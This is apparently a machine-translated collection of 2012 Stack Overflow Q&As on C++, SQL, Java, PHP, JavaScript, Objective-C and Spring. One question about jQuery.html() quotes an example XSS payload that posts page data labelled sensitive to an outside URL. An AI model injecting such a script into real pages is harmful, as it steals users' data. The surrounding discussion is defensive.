如果您想要一个指向 的 2D 指针数组`<whatever>`，请创建一个类来处理它，然后将它的一个实例放在您的 TestClass 中。至于如何做到这一点，我通常会在这个订单上使用一些东西：

```
template <class T>
class matrix2d {
    std::vector<T> data;
    size_t cols;
    size_t rows;
public:
    matrix2d(size_t y, size_t x) : cols(x), rows(y), data(x*y) {}
    T &operator()(size_t y, size_t x) { 
        assert(x<=cols);
        assert(y<=rows);
        return data[y*cols+x];
    }
    T operator()(size_t y, size_t x) const { 
        assert(x<=cols);
        assert(y<=rows);
        return data[y*cols+x];
    }
};

class TestClass { 
    matrix2d<int *> array(10, 10);
public:
    // ...
}; 
```

但是，鉴于您正在存储指针，您可能需要考虑使用 Boost[`ptr_vector`](http://www.boost.org/doc/libs/1_50_0/libs/ptr_container/doc/ptr_vector.html)而不是`std::vector`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T17:54:47.753

```
#define X 10
#define Y 10

struct TestClass
{
public:
  TestClass()
  {
    // Must initialize pArray to point to real int's otherwise pArray
    // will have bogus pointers.
    for (size_t y = 0; y < Y; ++y)
      {
    for (size_t x = 0; x < X; ++x)
      {
        pArray[x][y] = new int;
      }
      }
  }

  int      *pArray[X][Y];
};

int main()
{
  TestClass *Pointer_To_TestClass = new TestClass;
  delete Pointer_To_TestClass->pArray[0][0];
  Pointer_To_TestClass->pArray[0][0] = 0;
  return 0;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T17:01:12.120

如果您已经动态创建了一个数组，则使用 delete[] 将其删除。你必须给 delete[] 一个指向数组开头的指针，但是，不是数组的元素！

如果您希望元素可删除，则必须单独动态分配它们。

所以你必须有一个多维的指针数组；

```
int *(*pArray)[X][Y]; 
```

然后动态分配*每一个*，这*很*痛苦。

然而，有趣的是，您甚至试图这样做，为什么要删除单个元素？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T17:32:35.293

取决于你的分配`pArray[i][j]`。如果是这样的话，`pArray[i][j] = new int;`那就打电话`delete Pointer_To_TestClass->pArray[0][0];`。如果是这样`pArray[i][j] = new int[10]`，请使用您的第二个选项，`delete[] Pointer_To_TestClass->pArray[0][0];`. 我还强烈建议在删除后立即将其设置为 NULL 并继续检查 NULL。

第三个没有为我编译`delete[][] Pointer_To_TestClass->pArray[0][0];` 我得到了错误

> 第 34 行：错误：由于 -Wfatal-errors 导致 '[' 令牌编译终止之前的预期主表达式。

另外，我强烈建议在析构函数中进行这些删除。其他地方*可能也*很好。

您可能会发现 int* 的 typedef 有助于理解您有一个 int* 的二维数组的可读性。

# php - 如何将自定义类型数组传递给 Postgres 函数

> ID：12009822
> 
> 赞同：6
> 
> 时间：2012-08-17T16:45:55.363
> 
> 标签：php, sql, postgresql, postgresql-9.1, plpgsql

我有一个自定义类型

```
CREATE TYPE mytype as (id uuid, amount numeric(13,4)); 
```

我想将它传递给具有以下签名的函数：

```
CREATE FUNCTION myschema.myfunction(id uuid, mytypes mytype[])
  RETURNS BOOLEAN AS... 
```

我如何在 postgres 查询中调用它，并且不可避免地从 PHP 调用它？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-07-24T16:43:14.037

您可以将替代语法与[**数组文字**](https://www.postgresql.org/docs/current/sql-syntax-lexical.html#SQL-SYNTAX-STRINGS)一起使用，而不是数组构造函数，这是一个类似 Postgres 函数的构造，并且在您需要传递*值*时可能会导致麻烦- 就像在准备好的语句中一样：

```
SELECT myschema.myfunc('0d6311cc-0d74-4a32-8cf9-87835651e1ee'
                  , '{"(0d6311cc-0d74-4a32-8cf9-87835651e1ee, 25)"
                    , "(6449fb3b-844e-440e-8973-31eb6bbefc81, 10)"}'::mytype[]); 
```

我在数组中的两种行类型之间添加了一个换行符以进行显示。那是合法的。

### 如何找到*任何*文字的正确语法？

问问 Postgres。这是一个演示：

```
CREATE TABLE mytype (id uuid, amount numeric(13,4));

INSERT INTO mytype VALUES
  ('0d6311cc-0d74-4a32-8cf9-87835651e1ee', 25)
 ,('6449fb3b-844e-440e-8973-31eb6bbefc81', 10);

SELECT ARRAY(SELECT m FROM mytype m); 
```

回报：

```
{"(0d6311cc-0d74-4a32-8cf9-87835651e1ee,25.0000)","(6449fb3b-844e-440e-8973-31eb6bbefc81,10.0000)"} 
```

*db<>[在这里摆弄](https://dbfiddle.uk/?rdbms=postgres_13&fiddle=af7df37e843866c9dbe97eb50099fe25)*

任何表（包括临时表）都会隐式创建同名的行类型。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T18:52:00.360

```
select myschema.myfunc('0d6311cc-0d74-4a32-8cf9-87835651e1ee'
                , ARRAY[('ac747f0e-93d4-43a9-bc5b-09df06593239', '25.00')
                              , ('6449fb3b-844e-440e-8973-31eb6bbefc81', '10.00')]::mytype[]
    ); 
```

**虽然仍然需要解决这个问题的 PHP 部分，但仍然不确定如何调用填充自定义数组参数的函数。**

# sql-server - 在 Transact-SQL 中设置参数时如何连接字符串

> ID：12009832
> 
> 赞同：24
> 
> 时间：2012-08-17T16:46:36.293
> 
> 标签：sql-server, tsql

这里的第一个问题是以下。我编写了以下代码，一切正常：

```
DECLARE @subject NVARCHAR(100)
SET @subject = 'Report executed on ' + CONVERT(VARCHAR(12), GETDATE(), 107)
SELECT @subject 
```

结果：报告于 2012 年 8 月 17 日执行

但是在设置 msdb.dbo.sp_send_dbmail 过程的参数时尝试连接前一个字符串时，它会失败

```
EXEC msdb.dbo.sp_send_dbmail @profile_name='XXX',
@recipients='XXXX@XXXXX.com',
@subject = 'Report executed on ' + CONVERT(VARCHAR(12), GETDATE(), 107),
@body= @tableHTML,
@body_format = 'HTML'; 
```

我知道我可以声明一个变量并将其发送给参数，但我想了解为什么直接在参数中连接时它会失败。感谢您的时间和知识

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-08-17T16:55:50.767

T-SQL 存储过程的参数值不能是表达式。它们必须是常量或变量。

从[MSDN - 指定参数](http://msdn.microsoft.com/en-us/library/ms189260.aspx)：

> 过程调用提供的参数值必须是常量或变量；函数名不能用作参数值。变量可以是用户定义的或系统变量，例如@@spid。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-17T19:08:54.997

你需要做：

```
DECLARE @Sub nvarchar(100);
SET @Sub = 'Report executed on ' + CONVERT(VARCHAR(12), GETDATE(), 107);
EXEC msdb.dbo.sp_send_dbmail @profile_name='XXX',
@recipients='XXXX@XXXXX.com',
@subject = @Sub,
@body= @tableHTML,
@body_format = 'HTML'; 
```

# java - 预测 Java 内存

> ID：12009836
> 
> 赞同：3
> 
> 时间：2012-08-17T16:46:42.823
> 
> 标签：java, jakarta-ee, memory, memory-management

有没有办法预测我的 Java 程序将占用多少内存？我来自 C++ 背景，我在类上实现了诸如“size_in_bytes()”之类的方法，我可以相当准确地预测我的应用程序的运行时内存占用。现在我在一个 Java 世界中，这并不容易......有共享的引用、池、不可变对象......但我仍然希望能够在查看之前预测我的内存占用进程大小在顶部。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T17:06:20.107

如果您使用检测 API，则可以检查对象的大小。使用起来有点棘手——它需要一个“premain”方法和额外的 VM 参数——但网上有很多例子。“ **java instrumentation size** ”应该可以找到这些。

请注意，默认方法只会给你一个*浅*尺寸。除非您避免在构造函数之外进行任何对象构造（这几乎是不可能的），否则周围会有死对象等待垃圾收集。

但总的来说，如果您对生成的对象数量有很好的控制，您可以使用这些来估计应用程序的内存需求。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:54:41.563

您无法预测程序将占用的内存量。但是，您可以预测一个对象将花费多少。**编辑**结果我几乎完全错了，这个文档更好地描述了对象的内存使用：[http ://www.javamex.com/tutorials/memory/object_memory_usage.shtml](http://www.javamex.com/tutorials/memory/object_memory_usage.shtml)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T18:29:37.123

一般来说，您可以相当准确地预测给定对象将需要什么。有一些相对固定的开销，加上对象中的实例字段，加上适量的填充。但是随后对象大小被四舍五入到至少（在大多数 JVM 上）16 字节的边界，并且一些 JVM 将某些对象大小四舍五入到更大的边界（以允许使用标准大小的预分配对象帧）。但是对于给定的 JVM，所有这些都是相对固定的。

当然，不同的是垃圾收集所需的开销。一个简单的垃圾收集器需要 100% 的开销（每个分配的字节至少有一个空闲字节），尽管某些种类的“世代”收集器可以在一定程度上改进这一点。但是 GC 需要多少空间很大程度上取决于工作负载（在大多数 JVM 上）。

另一个问题是，当您以相对较低的分配级别运行时（您可能只使用了最大可用堆的 10%），那么垃圾就会积累。它没有被主动引用，但是垃圾位散布在您的活动对象中，因此它占用了工作集。因此，您的工作集往往大致等于您当前的总体垃圾收集堆大小（加上其他系统开销）。

当然，您可以“限制”堆大小，以便以更高的利用率运行，但这会增加垃圾收集的频率（以及较小程度的 GC 总成本）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T16:50:26.663

您可以使用分析器来了解始终在内存中的一组常量对象。然后你应该执行所有的代码路径来检查内存泄漏。[JProfiler](http://en.wikipedia.org/wiki/JProfiler)是一个很好的入门工具。

# model-view-controller - MVC 困惑，这应该进入视图还是控制器？

> ID：12009837
> 
> 赞同：0
> 
> 时间：2012-08-17T16:47:16.370
> 
> 标签：model-view-controller, codeigniter

我是 MVC 的新手，想知道在哪里放置一段代码的最佳实践是什么，无论是控制器还是视图（如果我不知道的话，甚至是模型）。

当前，应用程序从数据库中检索信息，一列是“类型”。然后根据类型，有一个 switch 语句准备要在视图中显示的 html 标签。

就像是：

```
 foreach ($data as &$dataPoint)
    {
        foreach ($dataPoint as &$postItem)
        {
            switch ($postItem['type'])
            {
                case "image":
                    $postItem['content'] = "<img src=\.$postItem['content']."\" />";
                    break;
                case "youtube":
                    $postItem['content'] = "<iframe src=\"http://www.youtube.com/embed/".$postItem['content']."?showinfo=0\" frameborder=\"0\"></iframe>";
                    break;
            }
        }
    } 
```

但是我只是不知道它应该去哪里，它应该直接在控制器中，然后再传递给视图吗？还是应该放在视图文件的顶部？

任何对 MVC 理论和设计的见解也将不胜感激:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:52:00.097

如果是显示逻辑，它应该在视图中。由于这似乎是显示逻辑，因此视图似乎是最好的地方。

这个答案的解释有点不同：[https ://stackoverflow.com/a/2574953/1324019](https://stackoverflow.com/a/2574953/1324019)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T18:28:35.877

是的，在你看来，就像其他人提到的那样。

您确实可以创建一个视图格式帮助文件来处理一些非通用 php 函数

```
foreach ($data as &$dataPoint)
    {
        foreach ($dataPoint as &$postItem)
        {
            //format_helper.php
            get_content_type($postItem);
        }
    } 
```

**format_helper.php**

```
if(!function_exists('get_content_type'){
    function get_content_type(array $postItem){
         switch ($postItem['type'])
            {
                case "image":
                    echo "<img src=\.$postItem['content']."\" />";
                    break;
                case "youtube":
                    echo "<iframe src=\"http://www.youtube.com/embed/".$postItem['content']."?showinfo=0\" frameborder=\"0\"></iframe>";
                    break;
            }
    }
}) 
```

# iphone - 我可以让两个重叠按钮同时响应两个事件吗

> ID：12009842
> 
> 赞同：0
> 
> 时间：2012-08-17T16:47:41.857
> 
> 标签：iphone, ios, ipad, cocos2d-iphone

在class1“init”方法中写了两个overLapping按钮（底部代码），但是这两个按钮被添加到（addChild）另一个类（class2）

如果我按下按钮（按钮）。两个按钮可以同时响应两个事件吗？

我希望 button1 响应 class1 方法

button2 响应 class2 方法

什么是这样做的好方法？

```
-(id)initWithPosition:(CGPoint)aPoint Mene:(CCMenu *)menu Fun:(SEL)fun
{

id aTarget = [menu parent];

NSString * imageName = @"light.png";

CCSprite* sprite1 = [CCSprite spriteWithSpriteFrameName:imageName];
CCSprite* sprite2 = [CCSprite spriteWithSpriteFrameName:imageName];
self.flashitemSprite=[CCMenuItemSprite itemWithNormalSprite:sprite1 selectedSprite:sprite2 target:aTarget selector:fun];
sprite1.visible=YES;
_flashitemSprite.position  = _flashSprite.position;
[menu addChild:self.flashitemSprite];

CCSprite* sprite3 = [CCSprite spriteWithSpriteFrameName:imageName];
CCSprite* sprite4 = [CCSprite spriteWithSpriteFrameName:imageName];
self.aItemSprite =[CCMenuItemSprite itemWithNormalSprite:sprite3 selectedSprite:sprite4 target:self selector:@selector(distroy)];
sprite3.visible=YES;
_aItemSprite.position  = _flashSprite.position;
[menu addChild:self.aItemSprite];

return self;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-20T15:06:24.073

如果两个按钮 100% 重叠且大小相同，那么您显然不需要两个按钮。只需一个按钮调用两个动作，或者通过使用一个调用另一种方法的动作选择器，或者通过将两个动作选择器实际分配给一个控件事件。

来自 Apple 的 UIControl 文档 - (void)addTarget:(id)target action:(SEL)action forControlEvents:(UIControlEvents)controlEvents 方法：

> 您可以多次调用此方法，并且可以为特定事件指定多个目标-动作对。动作消息可以可选地包括发送者和事件作为>参数，按该顺序。

如果两个按钮没有完全重叠，那么您想要三种行为：button1（如果触摸 button1 不重叠 button2 的部分）、button2（如果触摸 button2 不重叠 button1 的部分）、button1 & button2（如果触摸重叠部分）基于用户触摸的位置。. .

那么你应该在最上面的按钮中有代码来测试触摸是否在另一个按钮内。像这样的东西：

```
- (IBAction)buttonPressed:(id)sender forEvent:(UIEvent*)event
{
    UIView *button = (UIView *)sender;
    UITouch *touch = [[event touchesForView:button] anyObject];
    CGPoint location = [touch locationInView:button];
    CGPoint otherButtonLocation = [location locationInView:otherButton];

    if ([otherButton pointInside:otherButtonLocation withEvent:nil]) {

         [self otherButtonAction:otherButton];

    }

} 
```

上面的代码没有经过测试，可能不是最优的，只是给你一个想法的起点。

# javascript - 客户端格式化字符串

> ID：12009843
> 
> 赞同：0
> 
> 时间：2012-08-17T16:47:55.310
> 
> 标签：javascript, asp.net, html, string, string-formatting

> **可能重复：**
> [Javascript：将舍入数字格式化为 N 个小数](https://stackoverflow.com/questions/2221167/javascript-formatting-a-rounded-number-to-n-decimals)

我正在使用 JavaScript 修改标签文本

我需要在表单中格式化该标签文本（例如：45.00）。现在它显示为 (45)

我怎样才能从客户端实现这一点

为了从服务器端实现这一点，我正在做 - lb.Text = String.Format("{0:0.00}", rondedamount);

我需要来自客户端（内部标签）或 JavaScript 的这个。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:50:45.730

这可能对你有用：

```
var num = 45;
formated_num = num.toFixed(2);
console.log(formated_num); 
```

toFixed() 方法将数字转换为字符串，保留指定的小数位数。其中 toPrecision 以定点或指数表示法返回表示 Number 对象的字符串，四舍五入到精度有效数字。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T17:06:39.097

```
var num = 45;
alert(num.toFixed(2)); 
```

# php - Active Record，CodeIgniter - “on 子句不明确”

> ID：12009846
> 
> 赞同：1
> 
> 时间：2012-08-17T16:48:29.457
> 
> 标签：php, activerecord, codeigniter-2, grocery-crud

我有两张表我想加入[GroceryCRUD](http://www.grocerycrud.com/)。

我的控制器的一部分：

```
 /* Generate CRUD for buildings table */
    function buildings()
    {
        try{
            $crud = new grocery_CRUD();

            $crud->set_theme('datatables');
            $crud->set_table('buildings');
            $crud->set_subject('Campus Building');
            $crud->columns('building_code', 'building_name', 'description', 'latitude', 'longitude');
            $crud->add_action('Images', '', '','ui-icon-image',array($this,'image_gallery_action')); // link to building image gallery
            $crud->fields('building_code', 'building_name', 'description', 'latitude', 'longitude', 'created_on', 'updated_on'); // only display building_code, building_name, description and lat/long in the add/edit view
            $crud->change_field_type('created_on', 'invisible');
            $crud->change_field_type('updated_on', 'invisible');

            $crud->set_model('gallery_join_model'); // model created to join building and building_galleries

            $crud->callback_after_insert(array($this, 'gallery_urls_after_insert')); // auto generate iphone and ipad gallery urls on insert
            $crud->callback_before_delete(array($this, 'gallery_urls_before_delete')); // auto delete iphone and ipad gallery urls on delete

            $output = $crud->render();

            $this->_example_output($output);

        }catch(Exception $e){
            show_error($e->getMessage().' --- '.$e->getTraceAsString());
        }
    } 
```

连接表的模型：

```
<?php
class gallery_join_model extends grocery_CRUD_Model {

// --------------------------------------------------------------------
/**
  * Initialization function (__construct)
  *
  * Initialize, get parent properties and retrieve any messages
  *
  * @access public
  * @return void
  */
public function __construct(){
  parent::__construct();
}

function get_list() {

  if($this->table_name === null) {
   return false;
  }

  $select = "{$this->table_name}.*";

  $_select = array(
   'building_galleries.gallery_id',
   'building_galleries.building_id g1',
   'building_galleries.gallery_ipad_url',
   'building_galleries.gallery_url',
   );
  $select .= ','. implode(',', $_select);
  if( ! empty($this->relation))
   foreach ($this->relation as $relation) {
        list($field_name , $related_table , $related_field_title) = $relation;

        $unique_join_name = $this->_unique_join_name($field_name);
        $unique_field_name = $this->_unique_field_name($field_name);

        if (strstr($related_field_title,'{')) {
         $select .= ", CONCAT('".str_replace(array('{','}'),array("',COALESCE({$unique_join_name}.",", ''),'"),str_replace("'","\\'",$related_field_title))."') as $unique_field_name";
        }
        else {
         $select .= ", $unique_join_name.$related_field_title as $unique_field_name";
        }

        if ($this->field_exists($related_field_title)) {
         $select .= ", {$this->table_name}.$related_field_title as '{$this->table_name}.$related_field_title'";
        }
   }

  $this->db->select($select, false);

  $this->db->join('building_galleries','building_id = g1');

   $results = $this->db->get($this->table_name)->result();

         return $results;
        }
} 
```

错误：

```
Error Number: 1052

Column 'building_id' in on clause is ambiguous

SELECT buildings.*, building_galleries.gallery_id, building_galleries.building_id g1, building_galleries.gallery_ipad_url, building_galleries.gallery_url FROM `buildings` JOIN `building_galleries` ON `building_id` = `g1`

Filename: C:\xampp\htdocs\system\database\DB_driver.php

Line Number: 384 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:50:17.300

您需要在`ON`列前加上别名或表名。

```
SELECT buildings.*, building_galleries.gallery_id, building_galleries.building_id g1, building_galleries.gallery_ipad_url, building_galleries.gallery_url FROM `buildings` JOIN `building_galleries` ON `building_id` = `g1` 
```

应该：

```
SELECT buildings.*, building_galleries.gallery_id, building_galleries.building_id g1, building_galleries.gallery_ipad_url, building_galleries.gallery_url FROM `buildings` JOIN `building_galleries` ON `buildings.building_id` = building_galleries.building_id 
```

# javascript - Javascript返回false，警报不起作用

> ID：12009848
> 
> 赞同：1
> 
> 时间：2012-08-17T16:48:51.613
> 
> 标签：javascript, forms, return, handler, onsubmit

我正在尝试确保我的表单中的某些字段没有留空。它看起来很简单，但由于某种原因它不起作用。警报未显示，并且返回 false 不起作用（它继续将空白条目发布到我的数据库中）请帮助，我做错了什么。谢谢你！

剧本：

```
function check(){
var name = getElementById('name');
var date = getElementById('date');
var pri = getElementById('pri');
var asapc = getElementById('asapc');
var asapn = getElementById('asapn');
var obr = getElementById('obr');
var obc = getElementById('obc');
var obn = getElementById('obn');
  if (name.value == "" || date.value == "" || pri.value == "not" || asapc.value == "" ||  asapn.value == "" || obr.value == "" || obc.value == "" || obn.value == "") {
    alert( "One or more fields were not filled out." );
    return false ; }
    return true;
 } 
```

编码：

```
<FORM ACTION="step2.php" METHOD="POST" onsubmit="check();">
<!-- fields here -->
<INPUT TYPE="submit" VALUE="CONTINUE"> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T16:52:31.463

访问每个元素，`document.getElementById...`并在表单标签中写这个，`onsubmit="return check();"`而不是如果`onsubmit="check();"`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T16:49:49.630

您在这里缺少回报：

```
<FORM ACTION="step2.php" METHOD="POST" onsubmit="return check();"> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T17:01:30.860

您缺少（文档）这是正确的语法：

```
document.getElementById('id');

<script>
function check() {
var name = document.getElementById('name');
var date = document.getElementById('date');
  if (name.value == "" || date.value == "") {
        alert( "One or more fields were not filled out.");
        return false; 
    }
}
</script> 
```

getElementByID 表示 ID 不是我的 tagName

```
<FORM ACTION="step2.php" METHOD="POST" onsubmit="return check();">
  <input name="name" type="text" value="" id="name">
  <input name="date" type="text" value="" id="date">
   .....etc..
  <INPUT TYPE="submit" VALUE="CONTINUE">
</FORM> 
```

# objective-c - 类型名称不允许指定存储类

> ID：12009852
> 
> 赞同：7
> 
> 时间：2012-08-17T16:49:16.430
> 
> 标签：objective-c, extern

```
@interface Foo : NSObject

{
    extern int gGlobalVar;   
    int i;
}
-(void)setgGlobalVar:(int)val;

@end

@implementation Foo

-(void)setgGlobalVar:(int)val
{  
    i = 5;
    NSLog(@"i = %i", i);
    gGlobalVar = val;
}

@end 
```

我可以`i`在接口中声明并在实现中使用它而不会出现任何错误。但是我不能`extern`在接口中声明类型的变量。为什么会这样？为什么我会收到一条错误消息：“类型名称不允许指定存储类”？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-17T16:53:07.330

**简短描述：**`@interface`类OR 的括号部分`@implementation`仅用于*声明*实例变量（又名“ivar”）。该`extern`关键字仅用于全局变量声明（或函数，但这是另一个主题）。
因此，您不能声明 extern ivar。

**细节细节：** 变量首先被声明，然后被定义。对于局部范围内的变量，这种区别通常是模糊的，因为没有显式定义的局部声明变量通常会被编译器分配并赋予默认值。

全局变量可能在任何范围内可用，前提是该范围知道全局存在。这就是关键字`extern`出现的地方——它*声明*全局变量存在，并在其他地方*定义*。这仅在您想要访问不同代码文件中的全局变量时才有用。

**最佳实践：**您的书中有一些代码在实现文件（例如“.m”文件等）中声明了一个`extern`变量......这可以工作，但这是一种不好的做法，因为您对是否存在潜在的错误假设global 实际上在其他地方有一个有效的定义。（但是，花哨的编译器会发现这种类型的错误。）

相反，最佳实践是在头文件中声明一次外部变量，附带一个专用于在该头文件中定义外部变量的实现文件，然后将该头文件包含在其他想要使用该全局变量的实现文件中。

# javascript - jQuery.html() 危险吗？

> ID：12009854
> 
> 赞同：2
> 
> 时间：2012-08-17T16:49:29.723
> 
> 标签：javascript, jquery, security

> **可能重复：**
> [html() vs innerHTML jquery/javascript & XSS 攻击](https://stackoverflow.com/questions/8318581/html-vs-innerhtml-jquery-javascript-xss-attacks)

jQuery.html() 危险吗？

```
$("#id").html("<span>"+ variable + "</span>"); 
```

与上面的示例一样，如果变量将具有以下值：

```
"<script> $.post("external_url.php", {sesitivedata= $("#someElement").text()}, function() {} ) </script>" 
```

脚本会被执行吗？如果是这样，有什么方法可以让变量包含普通的 html 标签而不是脚本？

编辑：将脚本标签添加到字符串

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-17T16:55:20.643

是的，该脚本将被执行。

[http://jsfiddle.net/9ybUJ/2/](http://jsfiddle.net/9ybUJ/2/)

隐式`.html()`查找任何脚本元素并评估它们。这与`.innerHTML`从不执行 html 中的脚本相反。

# php - 使用 htaccess 在 Apache 中将 HTTP GET 请求重写为 POST

> ID：12009857
> 
> 赞同：6
> 
> 时间：2012-08-17T16:49:52.610
> 
> 标签：php, apache, .htaccess, rewrite

我需要更改第三方 PHP 应用程序的行为，并在此之后不久恢复更改。如果我可以重写 GET 请求并从中生成 POST 请求，我将节省大量时间并且可以避免对应用程序进行任何更改。

是否可以使用 .htaccess 将 GET`http://website/action1?param=1`转换为 POST `http://website/action2`，其中***参数***是发布请求的一部分？

虽然，我可以将第一个 GET 请求重定向到一个新页面，该页面将自动 POST 到第二个 URL（Javascript），但我希望尽可能少地保持浏览器-服务器交互的数量。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T18:02:56.210

> 是否可以使用 .htaccess 将 GET`http://website/action1?param=1`转换为 POST `http://website/action2`，其中参数是发布请求的一部分？

不，这是不可能的。GET 和 POST 是完全不同的请求，具有不同的请求标头和不同的响应。重写引擎只影响 URI，不能改变实际的请求。您将不得不在浏览器端依赖 Javascript。

# java - 结合上下文：property-override 和 PropertyPlaceholderConfigurer

> ID：12009858
> 
> 赞同：0
> 
> 时间：2012-08-17T16:50:00.217
> 
> 标签：java, spring

我对以下spring上下文配置文件有疑问：

```
...
   <context:property-override location="classpath:query_1.properties" />
        <bean
            class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
            <property name="locations" value="classpath:query_2.properties" />
        </bean>
.... 
```

问题是找不到文件“query_2.properties”中的属性。我得到的例外是他跟随一个：

```
Exception in thread "main" org.springframework.beans.factory.BeanDefinitionStoreException. Could not resolve placeholder... 
```

现在我的问题是：context:property-override 和 PropertyPlaceholderConfigurer 的组合是否没有意义？谁能用简单的话解释一下两者之间有什么区别？任何帮助，将不胜感激。

谢谢。贺拉斯

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T17:32:29.913

属性占位符，通常使用 a 定义，`<context:property-placeholder location=../>`解析 bean 定义中的占位符：

例如。

```
<bean name="myclass" class="MyClass">
    <property name="prop1" value="${prop1val}/>
</bean> 
```

如果使用属性占位符指定的位置具有名称为 prop1val 的属性：

```
prop1val=aval 
```

然后它将在 bean 中替换`myclass`。

使用另一个定义的 PrpertyOverrideConfigurer`<context:property-override location="classpath:query_1.properties" />`就像一个推送机制，属性是表单`beanname.property`，它会将该属性推送到具有 name 的 bean 中`beanname`。

例如。对于上述情况，如果该位置具有以下属性：

```
myclass.prop1=aval 
```

`prop1`然后它会注入`myclass`bean

您得到的异常只是表明它无法找到`query_2.properties`文件，我怀疑它是否是任何其他配置问题。

如果两者都定义了，哪个将生效，我认为最后一个将生效。

# performance - 避免 UITableViewCell 重用是合理的 UITableView 实现

> ID：12009859
> 
> 赞同：1
> 
> 时间：2012-08-17T16:50:00.973
> 
> 标签：performance, ios5, uitableview

我知道重用`UITableViewCell`对象是提高`UITableView`性能的关键。

但是我必须模拟一个`UITableView`带有分组单元格的表单，其中每个组是一个表单部分，每个单元格是一个表单输入（最终会`UIViewController`在导航堆栈中推送另一个以输入实际数据）。

部分和单元格的数量是恒定的且很小（不超过 10 个单元格），我试图访问它们而不必考虑`indexPath`值。我想创建单元格作为控制器的属性，并在`cellForRowAtIndexPath`方法中分配它们而不是重用它们。

就性能而言，这是一种有效的方法吗？还有其他值得避免重用`UITableViewCell`实例的情况吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T17:09:47.157

我认为在您的情况下（大约 10 个项目），不重复使用表格视图单元格是完全合理的。当我不得不创建一些注册表单时，我自己做过一次 - 我刚刚在 xib 文件中创建了单元格并从 cellForRowAtIndexPath 返回它们。

它不会受到性能影响，因为没有执行任何繁重的计算。如果您的自定义单元格使用一些大图像（或其他消耗内存的项目），则可能是内存消耗问题。但这通常不是设置/注册或简单表单的情况。

我会一直重复使用单元格，除非您有带有自定义单元格的小表格。就我个人而言，如果不是自定义单元格，即使有 3-4 行，我也会重复使用单元格。

# java - 用于确定程序在执行期间使用的 cpu 和内存的 java 库

> ID：12009862
> 
> 赞同：0
> 
> 时间：2012-08-17T16:50:14.387
> 
> 标签：java, memory-management, cpu-usage

我想测量 Java 程序的 CPU 和内存利用率水平，最好使用 GUI 和图表来显示整个程序执行期间的准确利用率水平。

是否有这样做的库/框架？

另外，如果我可以测量在本地系统或远程计算机上运行的程序（桌面或 Web 应用程序）的这种使用情况，我会更喜欢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:52:07.663

您可以使用 Eclipse TPTP： http: [//www.eclipse.org/tptp/](http://www.eclipse.org/tptp/)

它包含非常好的工具来跟踪线程以及内存和 cpu 消耗，所有这些都在一个清晰的 GUI 中。作为每个 java 分析器，它可以配置为遵循远程 java 程序。

如果您使用 Eclipse 作为您的 IDE，这是一个自然的选择。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:52:19.940

[JProfiler](http://en.wikipedia.org/wiki/JProfiler)是很好的开始。您可以将其连接到本地或远程 java 进程并分析应用程序以了解内存使用情况和各种其他性能计数器。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T16:55:21.077

我会说[VisualVM](http://visualvm.java.net/)将是一个好的开始。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T16:58:01.263

也可以试试[VisualVM](http://visualvm.java.net/)，它完全免费捆绑在 oracle jdk 中（不知道 openjdk）。

# macos - 关闭 NSWindow 时防止保存提示

> ID：12009863
> 
> 赞同：5
> 
> 时间：2012-08-17T16:50:14.697
> 
> 标签：macos, cocoa, nswindow, nswindowcontroller, document-based

我有一个基于文档的 Cocoa 应用程序，它使用辅助`NSWindow`预览模式（`shouldCloseDocument`设置为`NO`）。

如果文档很脏（已编辑但未保存）并且我关闭了辅助文档`NSWindow`，则会出现*“是否要保存对文档所做的更改”*提示。

我怎样才能避免在二级上出现这个提示`NSWindow`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T17:25:16.367

具体来说，您可以在 viewController 子类中执行此操作：确保将委托从窗口设置为所有者类：

```
//-------------------------------------------------------
- (void)windowControllerDidLoadNib:(NSWindowController *)aController
{
NSLog (@"windowControllerDidLoadNib");
    aController.document = nil;
    [super windowControllerDidLoadNib:aController];

............. etc....... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-19T14:37:55.447

我找不到办法做到这一点。我希望找到在保存提示之前调用的`NSWindowDelegate`or方法，但没有一个明显的候选者（ , , , ）是。`NSWindow``windowWillClose``close``performClose``windowShouldClose`

作为一种解决方法，`NSWindowController.document`我不是设置而是使用自定义属性来传递文档。`document`设置为，`NIL`不再显示保存提示。

# authentication - CFML：经过身份验证的用户在第三方论坛插件上匹配，因此他“登录”

> ID：12009864
> 
> 赞同：0
> 
> 时间：2012-08-17T16:50:15.980
> 
> 标签：authentication, coldfusion, forum

好吧，情况就是这样。

我的工作任务是将冷融合论坛 (Galleon) 集成到商家使用的现有 CRM 中。

